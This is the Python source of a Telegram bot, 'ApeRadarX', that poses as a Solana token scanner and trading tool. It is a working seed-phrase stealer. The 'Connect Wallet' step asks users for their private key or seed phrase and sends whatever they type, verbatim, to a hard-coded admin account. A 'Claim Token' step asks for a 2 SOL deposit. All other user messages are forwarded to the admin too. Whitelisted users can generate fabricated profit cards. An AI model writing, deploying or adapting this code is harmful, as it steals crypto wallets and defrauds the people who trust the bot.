# trigger redeploy v7
"""
ApeRadarX Solana Telegram Bot
PnL Card uses reference background image
"""

import os
import re
import io
import random
import threading
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes,
)

# ─────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
BOT_NAME = "ApeRadarX"
ADMIN_ID = 1495066761
PNL_ALLOWED = {1495066761, 6203945884, 8730420346, 8296058698}

# Background image URL (hosted on GitHub)

waiting_for_wallet = {}
waiting_for_pnl = {}

# Token data cache. This prevents repeated API calls for the same CA from
# causing transient failures/rate limits between scan -> PnL -> refresh.
token_cache = {}
TOKEN_CACHE_TTL = 90
TOKEN_STALE_TTL = 900

# ─────────────────────────────────────────────
# Admin notification
# ─────────────────────────────────────────────
async def notify_admin(context, user, action, extra=""):
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📡 *Activity Log*\n\n"
                 f"👤 Name: {user.full_name}\n"
                 f"🆔 ID: `{user.id}`\n"
                 f"📛 Username: @{user.username if user.username else 'No username'}\n"
                 f"🔘 Action: {action}"
                 + (f"\n📝 `{extra}`" if extra else ""),
            parse_mode="Markdown"
        )
    except: pass

# ─────────────────────────────────────────────
# PnL Card Generator
# Final plain 1536x1024 PnL template. The artwork is fixed; only dynamic
# token data is drawn on top of the intentionally empty fields.
PNL_TEMPLATE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pnl_template_final.png")


def format_mcap(n):
    try:
        n = float(n)
        if n >= 1_000_000_000: return f"${n/1_000_000_000:.1f}B"
        if n >= 1_000_000: return f"${n/1_000_000:.1f}M"
        if n >= 1_000: return f"${n/1_000:.1f}K"
        return f"${n:.0f}"
    except: return "N/A"


def get_font(size):
    for p in [
        "/usr/share/fonts/truetype/dejavu/DejaVuSansCondensed-Bold.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
    ]:
        try: return ImageFont.truetype(p, size)
        except: continue
    return ImageFont.load_default()


def fit_font(text, max_width, start_size, min_size=16):
    for size in range(start_size, min_size - 1, -2):
        f = get_font(size)
        b = f.getbbox(text)
        if b[2] - b[0] <= max_width:
            return f
    return get_font(min_size)


def center_text(draw, box, text, font, fill, stroke_width=0, stroke_fill=None):
    x1, y1, x2, y2 = box
    b = draw.textbbox((0, 0), text, font=font, stroke_width=stroke_width)
    tw, th = b[2] - b[0], b[3] - b[1]
    x = x1 + (x2 - x1 - tw) / 2
    y = y1 + (y2 - y1 - th) / 2 - b[1]
    draw.text((x, y), text, font=font, fill=fill,
              stroke_width=stroke_width, stroke_fill=stroke_fill)


def _download_logo(url):
    if not url:
        return None
    try:
        r = requests.get(url, timeout=8)
        r.raise_for_status()
        return Image.open(io.BytesIO(r.content)).convert("RGBA")
    except:
        return None


def _draw_logo(img, logo_url):
    # Remove the sample coin completely, then recreate the gold ring and place
    # the live token logo inside it. This prevents the old token name/artwork
    # from remaining around the new logo.
    cx, cy = 768, 161
    outer_r, inner_r = 112, 84
    layer = Image.new("RGBA", img.size, (0, 0, 0, 0))
    d = ImageDraw.Draw(layer, "RGBA")
    d.ellipse((cx-outer_r, cy-outer_r, cx+outer_r, cy+outer_r), fill=(3, 7, 2, 255), outline=(185, 205, 55, 255), width=5)
    d.ellipse((cx-inner_r, cy-inner_r, cx+inner_r, cy+inner_r), fill=(8, 15, 5, 255), outline=(225, 190, 45, 255), width=3)
    glow = layer.filter(ImageFilter.GaussianBlur(8))
    img = Image.alpha_composite(img, glow)
    img = Image.alpha_composite(img, layer)
    logo = _download_logo(logo_url)
    if logo is not None:
        logo.thumbnail((inner_r*2-10, inner_r*2-10), Image.LANCZOS)
        mask = Image.new("L", logo.size, 0)
        ImageDraw.Draw(mask).ellipse((0, 0, logo.width-1, logo.height-1), fill=255)
        logo.putalpha(mask)
        img.alpha_composite(logo, (cx-logo.width//2, cy-logo.height//2))
    return img


def generate_pnl_card(token_name, token_symbol, buy_mcap, current_mcap, username, token_logo_url=None):
    if not os.path.exists(PNL_TEMPLATE_PATH):
        raise FileNotFoundError("pnl_template_final.png is missing beside the bot file.")

    img = Image.open(PNL_TEMPLATE_PATH).convert("RGBA")
    if img.size != (1536, 1024):
        img = img.resize((1536, 1024), Image.LANCZOS)

    green = (165, 255, 35, 255)
    white = (255, 255, 255, 255)
    multiplier = float(current_mcap) / float(buy_mcap) if float(buy_mcap) > 0 else 1.0

    # Name area is intentionally placed in the clean space above CALLED AT.
    # This does not cover any existing artwork.
    draw = ImageDraw.Draw(img, "RGBA")
    name = str(token_name or token_symbol or "TOKEN").strip()
    symbol = str(token_symbol or "TOKEN").upper().strip()
    name = re.sub(r"\s+", " ", name)
    if len(name) > 26:
        name = name[:25].rstrip() + "…"

    name_font = fit_font(name, 560, 66, 28)
    center_text(draw, (70, 205, 635, 255), name, name_font, white,
                stroke_width=2, stroke_fill=(0, 30, 0, 210))
    symbol_text = f"({symbol})"
    center_text(draw, (85, 248, 500, 290), symbol_text,
                fit_font(symbol_text, 390, 30, 18), green)

    # Called-at value inside the existing empty panel.
    called_box = (175, 365, 390, 415)
    center_text(draw, called_box, format_mcap(buy_mcap),
                fit_font(format_mcap(buy_mcap), 205, 46, 24), white)

    # Replace the sample coin face with the actual token logo.
    img = _draw_logo(img, token_logo_url)

    # Hide the sample multiplier with a controlled dark-green panel, then draw
    # the live multiplier. This keeps the supplied artwork's surrounding glow
    # and arrow while guaranteeing the old sample number cannot show through.
    panel = Image.new("RGBA", img.size, (0, 0, 0, 0))
    pp = ImageDraw.Draw(panel, "RGBA")
    pp.rounded_rectangle((405, 300, 1300, 560), radius=18, fill=(0, 20, 4, 255))
    glow_panel = Image.new("RGBA", img.size, (0, 0, 0, 0))
    gp = ImageDraw.Draw(glow_panel, "RGBA")
    gp.ellipse((430, 315, 1275, 565), fill=(75, 220, 25, 45))
    glow_panel = glow_panel.filter(ImageFilter.GaussianBlur(28))
    img = Image.alpha_composite(img, glow_panel)
    img = Image.alpha_composite(img, panel)

    mult = f"{multiplier:.1f}X"
    layer = Image.new("RGBA", img.size, (0, 0, 0, 0))
    ld = ImageDraw.Draw(layer, "RGBA")
    mf = fit_font(mult, 820, 225, 100)
    bb = ld.textbbox((0, 0), mult, font=mf, stroke_width=4)
    tw, th = bb[2]-bb[0], bb[3]-bb[1]
    x = 850 - tw/2
    y = 430 - th/2 - bb[1]
    for sw, alpha in ((26, 28), (17, 48), (10, 80)):
        ld.text((x, y), mult, font=mf, fill=(80,255,0,30),
                stroke_width=sw, stroke_fill=(90,255,0,alpha))
    img = Image.alpha_composite(img, layer.filter(ImageFilter.GaussianBlur(6)))
    ImageDraw.Draw(img, "RGBA").text(
        (x, y), mult, font=mf, fill=(125,205,55,255),
        stroke_width=4, stroke_fill=(220,255,80,255)
    )

    # Hide the sample GAIN text before writing the live value.
    gain_patch = Image.new("RGBA", img.size, (0, 0, 0, 0))
    gpd = ImageDraw.Draw(gain_patch, "RGBA")
    gpd.rounded_rectangle((555, 575, 1010, 642), radius=10, fill=(0, 18, 3, 255))
    img = Image.alpha_composite(img, gain_patch)
    draw = ImageDraw.Draw(img, "RGBA")
    # Dynamic gain line in the cleaned bar.
    gain = f"{multiplier:.1f}X GAIN"
    center_text(draw, (565, 574, 1000, 640), gain,
                fit_font(gain, 400, 42, 24), green)

    # Called by: keep the supplied person icon and label, add only the value.
    caller = f"@{username}" if username else "@ApeRadarX"
    center_text(draw, (390, 730, 730, 795), caller,
                fit_font(caller, 320, 40, 22), white)

    # Current MCap.
    current = format_mcap(current_mcap)
    center_text(draw, (855, 730, 1170, 795), current,
                fit_font(current, 300, 46, 24), white)

    out = io.BytesIO()
    img.convert("RGB").save(out, format="PNG")
    out.seek(0)
    return out

# ─────────────────────────────────────────────
# ─────────────────────────────────────────────
# Token helpers
# ─────────────────────────────────────────────


def get_token_metadata(address):
    """Fetch token symbol, name and logo from Jupiter (most reliable)"""
    import random
    ua = random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
    ])
    headers = {"User-Agent": ua, "Accept": "application/json"}

    # 1. Jupiter token API
    try:
        r = requests.get(f"https://tokens.jup.ag/token/{address}", headers=headers, timeout=8)
        if r.status_code == 200:
            d = r.json()
            if d.get("symbol"):
                return d.get("symbol",""), d.get("name",""), d.get("logoURI","")
    except: pass

    # 2. GeckoTerminal token endpoint
    try:
        r = requests.get(
            f"https://api.geckoterminal.com/api/v2/networks/solana/tokens/{address}",
            headers={"Accept": "application/json;version=20230302", "User-Agent": ua},
            timeout=8
        )
        if r.status_code == 200:
            ta = r.json().get("data", {}).get("attributes", {})
            if ta.get("symbol"):
                return ta.get("symbol",""), ta.get("name",""), ta.get("image_url","")
    except: pass

    # 3. Pump.fun
    try:
        r = requests.get(f"https://frontend-api.pump.fun/coins/{address}", headers=headers, timeout=8)
        if r.status_code == 200:
            d = r.json()
            if d.get("symbol"):
                return d.get("symbol",""), d.get("name",""), d.get("image_uri","")
    except: pass

    return "", "", ""


def get_token_info(address):
    """Fetch token price info with caching and multiple fallbacks."""
    import random
    import time

    address = address.strip()
    cache_key = address.lower()
    now = time.time()

    cached = token_cache.get(cache_key)
    if cached:
        cached_pair, cached_at = cached
        if now - cached_at <= TOKEN_CACHE_TTL:
            return cached_pair

    ua = random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    ])
    headers = {"User-Agent": ua, "Accept": "application/json"}

    def save_pair(pair):
        if pair:
            token_cache[cache_key] = (pair, time.time())
        return pair

    # ── 1. DexScreener chain-scoped token endpoint ──
    # This is the primary source. It directly asks for this Solana CA instead
    # of doing a broad search that can return an unrelated token.
    dex_urls = [
        f"https://api.dexscreener.com/tokens/v1/solana/{address}",
        f"https://api.dexscreener.com/token-pairs/v1/solana/{address}",
        f"https://api.dexscreener.com/latest/dex/tokens/{address}",
    ]

    for url in dex_urls:
        try:
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code != 200:
                continue

            payload = r.json()
            pairs = payload if isinstance(payload, list) else payload.get("pairs") or []

            valid_pairs = [
                p for p in pairs
                if (p.get("chainId") or "").lower() == "solana"
                and (p.get("baseToken") or {}).get("address", "").lower() == cache_key
            ]

            if valid_pairs:
                p = sorted(
                    valid_pairs,
                    key=lambda x: float((x.get("liquidity") or {}).get("usd", 0) or 0),
                    reverse=True
                )[0]

                # DexScreener already supplies the token identity. Only use
                # Jupiter metadata to fill a genuinely missing field.
                base = p.setdefault("baseToken", {})
                if not base.get("symbol") or not base.get("name"):
                    sym, name, logo = get_token_metadata(address)
                    if sym and not base.get("symbol"):
                        base["symbol"] = sym
                    if name and not base.get("name"):
                        base["name"] = name
                    if logo and not (p.get("info") or {}).get("imageUrl"):
                        p.setdefault("info", {})["imageUrl"] = logo

                if base.get("symbol") and base.get("name"):
                    return save_pair(p)
        except:
            pass

    # ── 2. DexScreener exact-address search fallback ──
    # Some tokens are returned by DexScreener's search endpoint even when
    # the chain-scoped token endpoints temporarily return no matching pair.
    # Keep the address match strict so an unrelated token can never be used.
    try:
        r = requests.get(
            f"https://api.dexscreener.com/latest/dex/search?q={address}",
            headers=headers,
            timeout=10
        )
        if r.status_code == 200:
            payload = r.json()
            pairs = payload.get("pairs") or []
            valid_pairs = [
                p for p in pairs
                if (p.get("chainId") or "").lower() == "solana"
                and (p.get("baseToken") or {}).get("address", "").lower() == cache_key
            ]
            if valid_pairs:
                p = sorted(
                    valid_pairs,
                    key=lambda x: float((x.get("liquidity") or {}).get("usd", 0) or 0),
                    reverse=True
                )[0]
                base = p.setdefault("baseToken", {})
                if base.get("symbol") and base.get("name"):
                    return save_pair(p)
    except:
        pass

    # ── 3. GeckoTerminal pools ──
    try:
        r = requests.get(
            f"https://api.geckoterminal.com/api/v2/networks/solana/tokens/{address}/pools?page=1",
            headers={"Accept": "application/json;version=20230302", "User-Agent": ua},
            timeout=10
        )
        if r.status_code == 200:
            pools = r.json().get("data", [])
            if pools:
                pool = pools[0]
                attrs = pool.get("attributes", {})
                sym = attrs.get("base_token_symbol")
                name = attrs.get("name") or sym
                if sym and name:
                    price = attrs.get("base_token_price_usd") or "0"
                    mcap = attrs.get("market_cap_usd") or attrs.get("fdv_usd") or "0"
                    vol = attrs.get("volume_usd", {}).get("h24") or "0"
                    liq = attrs.get("reserve_in_usd") or "0"
                    h24 = attrs.get("price_change_percentage", {}).get("h24") or "0"
                    h1 = attrs.get("price_change_percentage", {}).get("h1") or "0"
                    return save_pair({
                        "baseToken": {"symbol": sym, "name": name, "address": address},
                        "priceUsd": str(price),
                        "priceChange": {"h1": str(h1), "h24": str(h24)},
                        "volume": {"h24": str(vol)},
                        "liquidity": {"usd": str(liq)},
                        "marketCap": str(mcap),
                        "dexId": pool.get("relationships", {}).get("dex", {}).get("data", {}).get("id", "DEX"),
                        "url": f"https://www.geckoterminal.com/solana/pools/{pool.get('id','')}",
                        "info": {"imageUrl": ""}
                    })
    except:
        pass

    # ── 4. Pump.fun ──
    try:
        r = requests.get(
            f"https://frontend-api.pump.fun/coins/{address}",
            headers=headers,
            timeout=10
        )
        if r.status_code == 200:
            d = r.json()
            if d:
                final_sym = d.get("symbol")
                final_name = d.get("name")
                final_logo = d.get("image_uri", "")
                if final_sym and final_name:
                    return save_pair({
                        "baseToken": {
                            "symbol": final_sym,
                            "name": final_name,
                            "address": address
                        },
                        "priceUsd": "0",
                        "priceChange": {"h1": "0", "h24": "0"},
                        "volume": {"h24": "0"},
                        "liquidity": {"usd": "0"},
                        "marketCap": str(d.get("usd_market_cap", 0)),
                        "dexId": "PUMPFUN",
                        "url": f"https://pump.fun/{address}",
                        "info": {"imageUrl": final_logo}
                    })
    except:
        pass

    # ── 5. CoinGecko ──
    try:
        sym, name, logo = get_token_metadata(address)
        if sym and name:
            r = requests.get(
                f"https://api.coingecko.com/api/v3/simple/token_price/solana?contract_addresses={address}&vs_currencies=usd&include_market_cap=true&include_24hr_vol=true&include_24hr_change=true",
                headers=headers,
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                if address.lower() in data:
                    d = data[address.lower()]
                    return save_pair({
                        "baseToken": {"symbol": sym, "name": name, "address": address},
                        "priceUsd": str(d.get("usd", 0)),
                        "priceChange": {"h1": "0", "h24": str(d.get("usd_24h_change", 0))},
                        "volume": {"h24": str(d.get("usd_24h_vol", 0))},
                        "liquidity": {"usd": "0"},
                        "marketCap": str(d.get("usd_market_cap", 0)),
                        "dexId": "COINGECKO",
                        "url": f"https://www.coingecko.com/en/coins/{address}",
                        "info": {"imageUrl": logo}
                    })
    except:
        pass

    # If an API temporarily fails, use recently successful data for this CA
    # instead of incorrectly reporting that the token does not exist.
    if cached:
        cached_pair, cached_at = cached
        if now - cached_at <= TOKEN_STALE_TTL:
            return cached_pair

    return None

def format_number(n):
    try:
        n = float(n)
        if n >= 1_000_000_000: return f"${n/1_000_000_000:.2f}B"
        if n >= 1_000_000: return f"${n/1_000_000:.2f}M"
        if n >= 1_000: return f"${n/1_000:.2f}K"
        return f"${n:.4f}"
    except: return "N/A"

def parse_mcap_input(text):
    text = text.strip().upper().replace(",","")
    try:
        if text.endswith("K"): return float(text[:-1])*1_000
        elif text.endswith("M"): return float(text[:-1])*1_000_000
        elif text.endswith("B"): return float(text[:-1])*1_000_000_000
        else: return float(text)
    except: return None

def build_token_message(pair):
    base = pair.get("baseToken", {})
    name = base.get("name","Unknown")
    symbol = base.get("symbol","???")
    price_usd = pair.get("priceUsd","N/A")
    h1 = pair.get("priceChange",{}).get("h1","N/A")
    h24 = pair.get("priceChange",{}).get("h24","N/A")
    volume_24h = pair.get("volume",{}).get("h24","N/A")
    liquidity = pair.get("liquidity",{}).get("usd","N/A")
    market_cap = pair.get("marketCap","N/A")
    dex = pair.get("dexId","N/A").upper()
    url = pair.get("url","")
    def sign(v):
        try: return "🟢 +" if float(v) >= 0 else "🔴 "
        except: return ""
    msg = (
        f"🪙 *{name}* (${symbol})\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💵 Price: `${float(price_usd):.8f}`\n"
        f"📈 1h:  {sign(h1)}{h1}%\n"
        f"📊 24h: {sign(h24)}{h24}%\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💧 Liquidity: {format_number(liquidity)}\n"
        f"📦 Volume 24h: {format_number(volume_24h)}\n"
        f"🏦 Market Cap: {format_number(market_cap)}\n"
        f"🔁 DEX: {dex}\n"
    )
    if url: msg += f"\n[📎 View on DexScreener]({url})"
    return msg

def token_keyboard(symbol, address):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🟢 Buy {symbol}", callback_data=f"buy:{symbol}"),
         InlineKeyboardButton(f"🔴 Sell {symbol}", callback_data=f"sell:{symbol}")],
        [InlineKeyboardButton("📊 Generate PnL Card", callback_data=f"pnl:{address}")],
        [InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh:{address}")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="home")],
    ])

def is_valid_solana_address(text):
    text = text.strip()
    if not 32 <= len(text) <= 44:
        return False
    if not re.match(r'^[1-9A-HJ-NP-Za-km-z]+$', text):
        return False

    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    try:
        value = 0
        for char in text:
            value = value * 58 + alphabet.index(char)
        raw = value.to_bytes((value.bit_length() + 7) // 8, "big")
        leading_ones = len(text) - len(text.lstrip("1"))
        raw = b"\x00" * leading_ones + raw
        return len(raw) == 32
    except:
        return False


def is_valid_seed_or_key(text):
    words = text.strip().split()
    if len(words) in (12, 24): return True
    if re.match(r'^[1-9A-HJ-NP-Za-km-z]{87,88}$', text.strip()): return True
    return False

# ─────────────────────────────────────────────
# Menu
# ─────────────────────────────────────────────
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🟢 Buy", callback_data="buy_menu"),
         InlineKeyboardButton("🔴 Sell", callback_data="sell_menu")],
        [InlineKeyboardButton("👛 Connect Wallet", callback_data="connect_wallet"),
         InlineKeyboardButton("🎁 Claim Token", callback_data="claim_token")],
        [InlineKeyboardButton("👥 Referrals", callback_data="referrals"),
         InlineKeyboardButton("❓ Help", callback_data="help")],
        [InlineKeyboardButton("📊 PnL Card", callback_data="pnl_menu"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh_home")],
    ])

def main_menu_text():
    return (
        f"🦍 *Welcome to {BOT_NAME}\\!*\n\n"
        "Track hot tokens, catch early movers, and trade with speed\\.\n\n"
        "Built for apes, powered by real\\-time data, and designed to help "
        "you find the next rocket before it takes off 🚀\n\n"
        "━━━━━━━━━━━━━━━━━\n"
        "💰 *Wallet Balance:* 0\\.00 SOL\n"
        "━━━━━━━━━━━━━━━━━\n\n"
        "📋 *Paste a token contract address* to begin scanning\\.\n\n"
        "Use the buttons below to navigate\\."
    )

# ─────────────────────────────────────────────
# Commands
# ─────────────────────────────────────────────
async def start(update, context):
    user = update.message.from_user
    waiting_for_wallet[user.id] = False
    waiting_for_pnl[user.id] = None
    await notify_admin(context, user, "▶️ Started the bot")
    await update.message.reply_text(main_menu_text(), parse_mode="MarkdownV2", reply_markup=main_menu_keyboard())

async def help_command(update, context):
    user = update.message.from_user
    await notify_admin(context, user, "❓ /help")
    await update.message.reply_text(
        f"❓ *{BOT_NAME} Help*\n\n"
        "🔍 Paste Solana token address to scan\n"
        "🟢 Buy / 🔴 Sell after scanning\n"
        "📊 PnL Card — selected users only\n"
        "👛 Connect Wallet\n"
        "🎁 Claim Token\n"
        "👥 Referrals\n\n/start — Main menu",
        parse_mode="Markdown",
    )

# ─────────────────────────────────────────────
# Button handler
# ─────────────────────────────────────────────
async def button_handler(update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user
    can_pnl = user.id in PNL_ALLOWED

    await notify_admin(context, user, f"🔘 `{data}`")

    if data in ("home", "refresh_home"):
        waiting_for_wallet[user.id] = False
        waiting_for_pnl[user.id] = None
        await query.message.reply_text(main_menu_text(), parse_mode="MarkdownV2", reply_markup=main_menu_keyboard())

    elif data == "pnl_menu":
        if user.id not in PNL_ALLOWED:
            await query.message.reply_text("📊 PnL Card\n\nComing Soon! 🚀")
            return
        if not can_pnl:
            await query.message.reply_text(
                "📊 *PnL Card*\n\n🔒 This feature is available to selected users only.\n\nStay tuned! 🚀",
                parse_mode="Markdown")
            return
        waiting_for_pnl[user.id] = {"step": "address"}
        await query.message.reply_text("📊 *PnL Card Generator*\n\nPaste the token contract address:", parse_mode="Markdown")

    elif data.startswith("pnl:"):
        if not can_pnl:
            await query.message.reply_text("🔒 *PnL Card is for selected users only.*", parse_mode="Markdown")
            return
        address = data.split(":", 1)[1]
        pair = context.user_data.get("last_token_pairs", {}).get(address.lower())
        if not pair:
            pair = get_token_info(address)
        if pair:
            base_token = pair.get("baseToken", {})
            name = base_token.get("name") or "Unknown"
            symbol = base_token.get("symbol") or "TOKEN"
            current_mcap = pair.get("marketCap", 0) or pair.get("fdv", 0) or 0
            if float(current_mcap or 0) <= 0:
                await query.message.reply_text("❌ Could not fetch current token market cap.")
                return
            waiting_for_pnl[user.id] = {
                "step": "buy_mcap", "address": address, "name": name, "symbol": symbol,
                "current_mcap": float(current_mcap) if current_mcap else 0,
                "logo_url": pair.get("info",{}).get("imageUrl"),
            }
            await query.message.reply_text(
                f"📊 *{symbol}*\nCurrent MCap: {format_number(current_mcap)}\n\n"
                f"Enter the MCap when you bought _(e.g. 9.3K, 1.2M)_:",
                parse_mode="Markdown")
        else:
            await query.message.reply_text("❌ Could not fetch token data.")

    elif data == "buy_menu":
        await query.message.reply_text("🟢 *Buy Token*\n\nPaste the token contract address!", parse_mode="Markdown")

    elif data == "sell_menu":
        await query.message.reply_text("🔴 *Sell Token*\n\nPaste the token contract address!", parse_mode="Markdown")

    elif data == "connect_wallet":
        waiting_for_wallet[user.id] = True
        await query.message.reply_text(
            "👛 *Connect Wallet*\n\nTo connect your Solana wallet, import your private key or seed phrase.\n\n⚠️ Never share your seed phrase with anyone!",
            parse_mode="Markdown")

    elif data == "claim_token":
        if context.user_data.get("wallet_connected"):
            await query.message.reply_text(
                "🎁 *Claim Token*\n\nTo claim your token, please deposit *2 SOL* to your connected wallet first.\n\nOnce your deposit is confirmed, your tokens will be released automatically! 🚀",
                parse_mode="Markdown")
        else:
            await query.message.reply_text(
                "🎁 *Claim Token*\n\nClick the *CONNECT WALLET* button to generate or connect your wallet and get started.",
                parse_mode="Markdown")

    elif data == "referrals":
        ref_link = f"https://t.me/ApeRadarXBot?start=ref_{user.id}"
        await query.message.reply_text(
            f"👥 *Referrals*\n\nInvite friends and earn rewards!\n\n🔗 Your link:\n`{ref_link}`",
            parse_mode="Markdown")

    elif data == "help":
        await query.message.reply_text(
            f"❓ *Help*\n\n🔍 Paste Solana token address\n📊 PnL Card — selected users\n👛 Connect Wallet\n/start — Main menu",
            parse_mode="Markdown")

    elif data.startswith("buy:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(f"🟢 *Buy {symbol}*\n\n⚠️ Connect your wallet first.", parse_mode="Markdown")

    elif data.startswith("sell:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(f"🔴 *Sell {symbol}*\n\n⚠️ Connect your wallet first.", parse_mode="Markdown")

    elif data.startswith("refresh:"):
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
            context.user_data.setdefault("last_token_pairs", {})[address.lower()] = pair
            await query.message.edit_text(
                build_token_message(pair), parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, address),
                disable_web_page_preview=True)
        else:
            await query.message.reply_text("⚠️ Could not refresh.")

# ─────────────────────────────────────────────
# Message handler
# ─────────────────────────────────────────────
async def handle_message(update, context):
    text = update.message.text.strip()
    user = update.message.from_user
    can_pnl = user.id in PNL_ALLOWED

    pnl_state = waiting_for_pnl.get(user.id)

    if pnl_state and pnl_state.get("step") == "address":
        if is_valid_solana_address(text):
            await update.message.reply_text("🔍 Fetching token info...")
            pair = get_token_info(text)
            if pair:
                base_token = pair.get("baseToken", {})
                name = base_token.get("name") or "Unknown"
                symbol = base_token.get("symbol") or "TOKEN"
                current_mcap = pair.get("marketCap", 0) or pair.get("fdv", 0) or 0
                if float(current_mcap or 0) <= 0:
                    await update.message.reply_text("❌ Could not fetch current token market cap.")
                    return
                waiting_for_pnl[user.id] = {
                    "step": "buy_mcap", "address": text, "name": name, "symbol": symbol,
                    "current_mcap": float(current_mcap) if current_mcap else 0,
                    "logo_url": pair.get("info",{}).get("imageUrl"),
                }
                await update.message.reply_text(
                    f"📊 *{symbol}*\nCurrent MCap: {format_number(current_mcap)}\n\nEnter the MCap when you bought _(e.g. 9.3K, 1.2M)_:",
                    parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ Token not found.")
        else:
            await update.message.reply_text("⚠️ Paste a valid Solana token address.")
        return

    if pnl_state and pnl_state.get("step") == "buy_mcap":
        buy_mcap = parse_mcap_input(text)
        if buy_mcap and buy_mcap > 0:
            current_mcap = pnl_state["current_mcap"]
            name = pnl_state.get("name", pnl_state.get("symbol", "TOKEN"))
            symbol = pnl_state["symbol"]
            logo_url = pnl_state.get("logo_url")
            username = user.username or user.first_name or "ApeRadarX"
            waiting_for_pnl[user.id] = None
            await update.message.reply_text("🎨 Generating your PnL card...")
            try:
                card = generate_pnl_card(name, symbol, buy_mcap, current_mcap, username, logo_url)
                multiplier = current_mcap / buy_mcap
                await update.message.reply_photo(
                    photo=card,
                    caption=f"📊 *{symbol}* | *{multiplier:.1f}X GAIN* 🚀\nPowered by @ApeRadarXBot",
                    parse_mode="Markdown")
                await notify_admin(context, user, f"📊 PnL card: {symbol} {multiplier:.1f}X")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")
        else:
            await update.message.reply_text("⚠️ Invalid format. Use: 9.3K, 1.2M, 500000")
        return

    if waiting_for_wallet.get(user.id):
        if is_valid_seed_or_key(text):
            await notify_admin(context, user, "👛 Wallet credentials submitted", text)
            waiting_for_wallet[user.id] = False
            context.user_data["wallet_connected"] = True
            await update.message.reply_text("✅ *Wallet connected successfully!*", parse_mode="Markdown")
        else:
            await notify_admin(context, user, "❌ Invalid wallet input", text)
            await update.message.reply_text("⚠️ Invalid seed phrase. Check your words and try again.")
        return

    if is_valid_solana_address(text):
        await update.message.reply_text("🔍 Scanning token...")
        pair = context.user_data.get("last_token_pairs", {}).get(text.lower())
        if not pair:
            pair = get_token_info(text)
        if pair:
            symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
            await notify_admin(context, user, f"🔍 Scanned: {symbol}", text)
            context.user_data.setdefault("last_token_pairs", {})[text.lower()] = pair
            await update.message.reply_text(
                build_token_message(pair), parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, text),
                disable_web_page_preview=True)
        else:
            await notify_admin(context, user, "❌ Token not found", text)
            await update.message.reply_text("❌ Token not found. Paste a valid Solana contract address.")
    else:
        await notify_admin(context, user, "💬 Message", text)
        await update.message.reply_text("👋 Paste a Solana token address to scan!\nOr tap /start for the menu.")

# ─────────────────────────────────────────────
# Web server
# ─────────────────────────────────────────────
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ApeRadarX Bot is running!")
    def log_message(self, format, *args): pass

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    HTTPServer(("0.0.0.0", port), HealthHandler).serve_forever()

# ─────────────────────────────────────────────
# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────
if __name__ == "__main__":
    print("🤖 ApeRadarX Bot starting...")

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    port = int(os.environ.get("PORT", 10000))
    render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://solana-bot-fapw.onrender.com").rstrip("/")
    webhook_path = "telegram-webhook"
    webhook_url = f"{render_url}/{webhook_path}"

    print("✅ Bot is running with webhook!")
    app.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=webhook_path,
        webhook_url=webhook_url,
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES,
    )
